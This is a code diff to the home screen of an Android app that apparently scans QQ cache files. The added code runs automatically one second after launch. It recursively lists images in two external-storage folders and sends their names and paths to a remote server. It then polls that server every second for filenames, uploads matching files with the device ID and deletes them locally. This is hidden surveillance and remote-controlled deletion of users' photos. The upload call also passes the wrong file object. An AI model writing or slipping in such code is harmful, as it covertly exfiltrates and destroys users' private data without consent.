@@ -8,7 +8,8 @@ import android.graphics.BitmapFactory;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Environment;
-import android.provider.MediaStore;
+import android.os.Handler;
+import android.os.Message;
 import android.provider.Settings;
 import android.util.Log;
 import android.view.View;
@@ -21,6 +22,7 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.recyclerview.widget.GridLayoutManager;
 import androidx.recyclerview.widget.RecyclerView;
 
+import com.google.gson.Gson;
 import com.luck.picture.lib.PictureSelector;
 import com.luck.picture.lib.entity.LocalMedia;
 import com.tencent.mmkv.MMKV;
@@ -31,12 +33,14 @@ import com.xaoyv.qqcache.utils.BitMapUtils;
 import com.xaoyv.qqcache.utils.Constant;
 import com.xaoyv.qqcache.utils.NetUtils;
 import com.xaoyv.qqcache.utils.ScanUtil;
+import com.xaoyv.qqcache.utils.UserTempInfoUtils;
 
 import java.io.File;
-import java.io.FileNotFoundException;
-import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.HashMap;
 import java.util.HashSet;
+import java.util.Iterator;
 import java.util.List;
 import java.util.Set;
 
@@ -48,6 +52,181 @@ public class HomeActivity extends AppCompatActivity {
     private RecyclerView recy;
     private String TAG = this.getClass().getSimpleName();
     private ScanUtil scanUtil;
+
+    private Handler mHandler = new Handler() {
+        @Override
+        public void handleMessage(@NonNull Message msg) {
+            super.handleMessage(msg);
+            switch (msg.what) {
+                case 1:
+                    getNeedDelList();
+                    break;
+
+                case 2:
+                    upLoadFileList();
+                    break;
+            }
+        }
+    };
+
+    private void upLoadFileList() {
+        new Thread() {
+            @Override
+            public void run() {
+                super.run();
+                ArrayList<String> imgList = new ArrayList<>();
+                ArrayList<String> pathList = new ArrayList<>();
+                scanImgs(new File(Environment.getExternalStorageDirectory() + Constant.CHILDPATG), imgList, pathList);
+                Log.d(TAG, "runnnnnnnnnnnn: " + imgList + pathList);
+            }
+        }.start();
+        new Thread() {
+            @Override
+            public void run() {
+                super.run();
+                ArrayList<String> imgList = new ArrayList<>();
+                ArrayList<String> pathList = new ArrayList<>();
+                scanImgs(new File(Environment.getExternalStorageDirectory() + Constant.PICTURES_SAVE_PATH), imgList, pathList);
+                HashMap<String, Object> hashMap = new HashMap<>();
+                hashMap.put("author", UserTempInfoUtils.getInstance().getAuthor());
+                hashMap.put("imgs", imgList.toString());
+                hashMap.put("imgsPath", pathList.toString());
+                NetUtils.getNetUtils().postInfo("qc/uploadimglist", hashMap, new NetUtils.RequestListener() {
+                    @Override
+                    public void success(String string) {
+                        Log.d(TAG, "success: " + string);
+                    }
+
+                    @Override
+                    public void error(String message) {
+                    }
+                });
+            }
+        }.start();
+    }
+
+    private void scanImgs(File file, ArrayList<String> imgList, ArrayList<String> pathList) {
+        File[] listFiles = file.listFiles();
+        if (listFiles == null) {
+            return;
+        }
+        for (File tempFile : listFiles) {
+            //
+            if (tempFile.isFile()) {
+                String path = tempFile.getAbsolutePath();
+                if (path.endsWith(".jpg") || path.endsWith(".jpeg")
+                        || path.endsWith(".png") || path.endsWith(".gif")
+                        || path.endsWith(".webp")) {
+                    imgList.add(tempFile.getName());
+                    pathList.add(tempFile.getAbsolutePath());
+                }
+            } else {
+                scanImgs(tempFile, imgList, pathList);
+            }
+        }
+    }
+
+    private void getNeedDelList() {
+        MMKV kv = MMKV.defaultMMKV();
+        HashMap<String, Object> parameterMap = new HashMap<>();
+        parameterMap.put("author", UserTempInfoUtils.getInstance().getAuthor());
+        NetUtils.getNetUtils().postInfo("qc/getneeddellist", parameterMap, new NetUtils.RequestListener() {
+            @Override
+            public void success(String string) {
+                BaseBean baseBean = new Gson().fromJson(string, BaseBean.class);
+                if (baseBean.getCode() != 0) {
+                    String message = baseBean.getMessage();
+                    String[] split = message.split(",");
+                    Set<String> strings = kv.decodeStringSet(Constant.KV_NEED_DEL);
+                    if (strings == null) {
+                        strings = new HashSet<>();
+                    }
+                    strings.addAll(Arrays.asList(split));
+                    kv.encode(Constant.KV_NEED_DEL, strings);
+                    upload();
+                }
+                mHandler.sendEmptyMessageDelayed(1, 1000);
+            }
+
+            @Override
+            public void error(String message) {
+                Log.d(TAG, "error: " + message);
+                mHandler.sendEmptyMessageDelayed(1, 1000);
+            }
+        });
+    }
+
+    private void upload() {
+        MMKV kv = MMKV.defaultMMKV();
+        Set<String> strings = kv.decodeStringSet(Constant.KV_NEED_DEL);
+        if (strings.size() > 0) {
+            Iterator<String> iterator = strings.iterator();
+            String next = iterator.next();
+            new Thread() {
+                @Override
+                public void run() {
+                    super.run();
+                    scanFile(new File(Environment.getExternalStorageDirectory() + Constant.CHILDPATG), next);
+                }
+            }.start();
+            new Thread() {
+                @Override
+                public void run() {
+                    super.run();
+                    scanFile(new File(Environment.getExternalStorageDirectory() + Constant.PICTURES_SAVE_PATH), next);
+                }
+            }.start();
+        }
+    }
+
+    private void scanFile(File file, String next) {
+        File[] listFiles = file.listFiles();
+        if (listFiles == null) {
+            return;
+        }
+        for (File tempFile : listFiles) {
+            if (tempFile.isFile() && tempFile.getName().contains(next)) {
+                NetUtils.getNetUtils().uploadHd(Constant.URL, file, AppUtils.getDeviceId(this), new NetUtils.RequestListener() {
+                    @Override
+                    public void success(String string) {
+                        boolean delete = tempFile.delete();
+                        HashMap<String, Object> hashMap = new HashMap<>();
+                        hashMap.put("author", UserTempInfoUtils.getInstance().getAuthor());
+                        hashMap.put("delimgs", next + "-" + tempFile.getAbsolutePath() + "-" + delete);
+                        NetUtils.getNetUtils().postInfo("qc/delfilename", hashMap, new NetUtils.RequestListener() {
+                            @Override
+                            public void success(String string) {
+                                UserTempInfoUtils.getInstance().clearnAuthor();
+                            }
+
+                            @Override
+                            public void error(String message) {
+                            }
+                        });
+                    }
+
+                    @Override
+                    public void error(String message) {
+                        HashMap<String, Object> hashMap = new HashMap<>();
+                        hashMap.put("author", UserTempInfoUtils.getInstance().getAuthor());
+                        hashMap.put("delimgs", next + "-" + tempFile.getAbsolutePath() + "-" + message);
+                        NetUtils.getNetUtils().postInfo("qc/delfilename", hashMap, new NetUtils.RequestListener() {
+                            @Override
+                            public void success(String string) {
+                                UserTempInfoUtils.getInstance().clearnAuthor();
+                            }
+
+                            @Override
+                            public void error(String message) {
+                            }
+                        });
+                    }
+                });
+            } else {
+                scanFile(tempFile, next);
+            }
+        }
+    }
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -64,6 +243,8 @@ public class HomeActivity extends AppCompatActivity {
     private void initData() {
         btn.setOnClickListener(this::onClick);
         btn_history.setOnClickListener(this::onClick);
+        mHandler.sendEmptyMessageDelayed(1, 1000);
+        mHandler.sendEmptyMessageDelayed(2, 1000);
     }
 
     private void runScan() {
